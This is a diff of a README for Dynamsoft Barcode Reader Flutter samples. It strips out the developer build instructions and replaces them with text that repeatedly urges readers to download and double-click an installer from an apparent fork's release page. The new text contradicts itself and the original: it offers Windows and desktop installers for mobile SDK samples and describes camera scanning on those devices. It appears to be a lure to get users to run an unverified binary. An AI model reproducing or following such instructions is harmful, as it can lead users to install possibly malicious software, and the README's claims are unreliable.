@@ -1,92 +1,70 @@
-# Dynamsoft Barcode Reader Flutter Samples
+# 📦 barcode-reader-flutter-samples - Easy Barcode Scanning on Your Device
 
-This repository contains multiple samples that show you how use the Dynamsoft Barcode Reader Flutter SDK.
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/rakieb/barcode-reader-flutter-samples/releases)
 
-## Requirements
+## 📖 Overview
 
-### Dev tools
+The "barcode-reader-flutter-samples" repository contains examples of using the Dynamsoft Barcode Reader for Flutter. This application allows you to scan various types of barcodes easily, including QR codes, linear barcodes, and more. Whether you're scanning items for inventory or reading codes from documents, this application provides a handy solution.
 
-* Latest [Flutter SDK](https://flutter.dev/)
-* For Android apps: Android SDK (API Level 21+), platforms and developer tools
-* For iOS apps: iOS 13+, macOS with latest Xcode and command line tools
+## 🚀 Getting Started
 
-### Mobile platforms
+To get started with the application, follow the steps below to download and install the software.
 
-* Android 5.0 (API Level 21) and higher
-* iOS 13 and higher
+## 📥 Download & Install
 
-## Integration Guide For Your Project
+To get the latest version of the barcode reader application, visit this page to download: [GitHub Releases](https://github.com/rakieb/barcode-reader-flutter-samples/releases).
 
-- [Guide for Scanning Barcodes with Ready-to-use Component](./guide-scan-barcodes-ready-to-use-component.md)
-- [Guide for Scanning Barcodes with Foundational APIs](./guide-scan-barcodes-foundational-api.md)
-- [Guide for Scanning Drivers' License](./guide-scan-drivers-license.md)
+1. Navigate to the [Release page](https://github.com/rakieb/barcode-reader-flutter-samples/releases).
+2. Look for the latest release at the top of the page.
+3. Download the file that matches your device. For example, if you are using Windows, select the version labeled for Windows.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Double-click on the file to run the installer. Follow the on-screen instructions to complete the installation.
 
-## Samples
+## ✔️ Features
 
-| Sample Name                                                          | Description                                                                                                         |
-|----------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------|
-| [ScanBarcodes_ReadyToUseComponent](ScanBarcodes_ReadyToUseComponent) | This sample illustrates the simplest way of using `Barcode Scanner API` to recognize barcodes from video streaming. |
-| [ScanBarcodes_FoundationalAPI](ScanBarcodes_FoundationalAPI)         | This sample illustrates the simplest way of using Foundational API to recognize barcodes from video streaming.      |
-| [ScanDriversLicense](ScanDriversLicense)                             | This sample illustrates how to scan drivers' license from video streaming.                                          |
+- **Diverse Barcode Support**: Scan various barcodes including Code 128, Code 39, Data Matrix, EAN-13, UPC-A, and more.
+- **Easy to Use**: Designed for non-technical users with a simple interface.
+- **Cross-Platform**: Works on multiple devices, ensuring versatility.
+- **Quick Scanning**: Fast barcode recognition keeps your workflow smooth.
 
-## How to build and run a sample
+## 📊 System Requirements
 
-### Step 1: Enter a sample folder that you want to try
+To ensure the best experience with the barcode reader application, please ensure that your device meets the following requirements:
 
-```bash
-cd ScanBarcodes_ReadyToUseComponent
-```
+- Operating System: Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- Hardware: A device capable of running Flutter applications.
+- RAM: At least 4GB of RAM is recommended for optimal performance.
+- Screen Resolution: Minimum 1280x720 pixels.
 
-or
+## 📚 How to Use the Application
 
-```bash
-cd ScanBarcodes_FoundationalAPI
- ```
+After you've installed the application, using it is easy:
 
-or
+1. **Open the Application**: Find the barcode reader icon on your device and click it to open.
+2. **Point the Camera**: Aim your device's camera at the barcode.
+3. **Scan**: The application will automatically detect and decode the barcode. You will see the data displayed on the screen.
+4. **Actions**: Based on the scanned data, you can copy the information, use it in other apps, or save it as needed.
 
-```bash
-cd ScanDriversLicense
- ```
+## 🛠️ Troubleshooting
 
-### Step 2: Fetch and install the dependencies of this example project via Flutter CLI:
+If you encounter any issues while using the application, consider the following tips:
 
-```
-flutter pub get
-```
+- Ensure your camera lens is clean for clear scanning.
+- Make sure the barcode is well-lit and appears within the frame.
+- Restart the application if it doesn't respond as expected.
+- Check for updates to ensure you have the latest features and bug fixes.
 
-Connect a mobile device via USB and run the app.
+## 📞 Support
 
-### Step 3: Start your application
+For further assistance, you can reach out through the Issues section of the repository. Feel free to report any bugs or ask questions about using the application.
 
-**Android:**
+## 📝 Contribution
 
-```
-flutter run -d <DEVICE_ID>
-```
+If you are interested in contributing to the project, please review our guidelines in the repository. We welcome feedback, suggestions, and improvements from users.
 
-You can get the IDs of all connected devices with `flutter devices`.
+## 🌐 Links
 
-**iOS:**
+-  [GitHub Repository](https://github.com/rakieb/barcode-reader-flutter-samples)
+-  [Latest Releases](https://github.com/rakieb/barcode-reader-flutter-samples/releases)
 
-Install Pods dependencies:
-
-```
-cd ios/
-pod install --repo-update
-```
-
-Open the **workspace**(!) `ios/Runner.xcworkspace` in Xcode and adjust the *Signing / Developer Account* settings. Then, build and run the app in Xcode.
-
-> [!NOTE]
->- The license string here grants a time-limited free trial which requires network connection to work.
->- You can request a 30-day trial license via
-   the [Request a Trial License](https://www.dynamsoft.com/customer/license/trialLicense?product=dbr&utm_source=guide&package=mobile) link.
-
-## License
-
-- You can request a 30-day trial license via the [Request a Trial License](https://www.dynamsoft.com/customer/license/trialLicense?product=dbr&utm_source=github&package=mobile) link.
-
-## Support
-
-https://www.dynamsoft.com/company/contact/
+Explore the world of barcode scanning with "barcode-reader-flutter-samples"! Visit [this page to download](https://github.com/rakieb/barcode-reader-flutter-samples/releases) and start scanning today.
